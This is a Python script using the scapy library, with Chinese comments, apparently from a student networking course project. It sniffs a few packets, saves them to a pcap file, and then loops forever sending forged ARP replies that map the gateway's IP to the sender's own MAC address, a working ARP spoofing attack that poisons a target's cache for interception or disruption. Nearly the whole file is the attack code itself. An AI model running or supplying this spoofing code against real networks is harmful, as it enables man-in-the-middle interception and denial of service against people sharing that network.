# -*- coding: UTF-8 -*-

# from scapy.all import *
from scapy.all import *


def main(dpkt):
    # get_if_hwaddr为获取本机网络接口的函数，getmacbyip是通过ip地址获取其Mac地址的方法，ARP是构建ARP数据包的类，Ether用来构建以太网数据包，sendp方法在第二层发送数据包。
    class Packge(object):
        def __init__(self, my_interface, my_mac, target_mac, target_ip, gatewayip):
            self.my_interface = my_interface
            self.my_mac = my_mac
            self.target_mac = target_mac
            self.target_ip = target_ip
            self.gatewayip = gatewayip

    my_interface = 'wlo1'
    options = Packge(my_interface, get_if_hwaddr(my_interface), dpkt[0][Ether].src, dpkt[0][IP].src, dpkt[0][IP].dst)

    # 构建请求包
    def build_req():
        if options.target_ip is None:
            # 若无目标地址，则广播数据包
            pkt = Ether(src=options.my_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=options.my_mac, psrc=options.gatewayip, op=1)
        elif options.target_ip:
            pkt = Ether(src=options.my_mac, dst=options.target_mac) / ARP(hwsrc=options.my_mac, psrc=options.gatewayip, hwdst=options.target_mac, pdst=options.target_ip, op=1)
        return pkt

    # 构建响应包
    def build_rep():
        if options.target_ip is None:
            pkt = Ether(src=options.my_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=options.my_mac, psrc=options.gatewayip, op=2)
        elif options.target_ip:
            pkt = Ether(src=options.my_mac, dst=options.target_mac) / ARP(hwsrc=options.my_mac, psrc=options.gatewayip, hwdst=options.target_mac, pdst=options.target_ip, op=2)
        return pkt

    # 这里构建响应包
    pkt = build_rep()

    while True:
        sendp(pkt, inter=2, iface=options.my_interface)


def get_packge(bag_num):
    # 抓包
    # dpkt = sniff(filter = "tcp", count = 1, prn = lambda x: x.summary())
    # dpkt = sniff(filter="host 192.168.43.56", count = bag_num, prn = lambda x: x.show())
    dpkt = sniff(count = bag_num)  # 抓包
    dpkt.nsummary()
    
    # num = raw_input('Please enter the number to begin ARP spoofing: ')
    # num = int(num) # 这里的num是想要对某一记录的源进行欺骗，采用响应包的方式

    wrpcap('/home/roxbili/Desktop/Computer_course_design/demo.pcap', dpkt)  # 将上述抓取的包保存为pcap格式。
    return(dpkt)

def get_bag(bag_num):
    dpkt = get_packge(bag_num)
    main(dpkt)
    return dpkt

dpkt = get_bag(2)